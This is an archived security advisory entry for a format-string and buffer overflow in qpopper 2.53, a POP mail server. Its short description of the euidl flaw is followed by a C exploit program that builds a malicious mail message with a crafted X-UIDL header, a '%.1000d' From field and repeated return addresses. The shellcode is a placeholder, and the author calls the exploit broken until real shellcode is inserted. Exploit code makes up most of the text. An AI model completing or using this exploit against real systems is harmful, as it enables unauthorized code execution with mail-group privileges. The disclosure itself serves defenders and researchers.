source: http://www.securityfocus.com/bid/1242/info

A vulnerability exists in version 2.53 and prior of qpopper, a popular POP server, from Qualcomm. By placing machine executable code in the X-UIDL header field, supplying formatting strings in the "From:" field in a mail header, and then issuing, as the user the mail was sent to, a 'euidl' command, it is possible to execute arbitrary code. This code will execute as the user executing the euidl command, but with group 'mail' permissions on hosts running qpopper in that group. This is often done due to mail spool permissions.

This vulnerability does not exist in versions after 2.53. It also requires an account on the machine.

/*  qpop_euidl.c exploit by prizm/Buffer0verflow Security 
 *      
 *  Sample exploit for buffer overflow in Qpopper 2.53.
 *  This little proggie generates a mail u need to send.
 *
 *  Standard disclaimer applies.     
 *  By the way, exploit is broken =) You need to insert shellcode.
 *      
 *  MAD greets to tf8 for pointing out the bug, and all other b0f members.
 *  greets to USSRLabs and ADM
 *  check http://b0f.freebsd.lublin.pl/ for news.
 */     
#include <stdio.h>
#include <string.h>
        
char shellcode[]="imnothing";
int main(int argc, char *argv[])
{       
        int i;  
        unsigned long ra=0;
        if(argc!=2) {
                fprintf(stderr,"Usage: %s return_addr\n", argv[0]);
                exit(0);
        }
        sscanf(argv[1], "%x", &ra);
        if(!ra)
                return;
        if(sizeof(shellcode) < 12 || sizeof(shellcode) > 76) {
                fprintf(stderr,"Bad shellcode\n");
                exit(0);
        }
        fprintf(stderr,"return address: 0x%.8x\n", ra);
        printf("X-UIDL: ");
        for(i=0; i < sizeof(shellcode);i++)
                printf("%c", shellcode[i]);
        printf("\r\n");
        printf("From: %s", "%.1000d");    
        for(i=0; i < 50; i++)
                printf("%c%c%c%c", (ra & 0xff), (ra & 0xff00)>>8, (ra & 0xff0000)>>16, (ra & 0xff000000)>>24);
        printf("@test\r\n");
        printf("Subject: test\r\n\r\nhuh?\r\n.\r\n"); 
        return 0;
}         
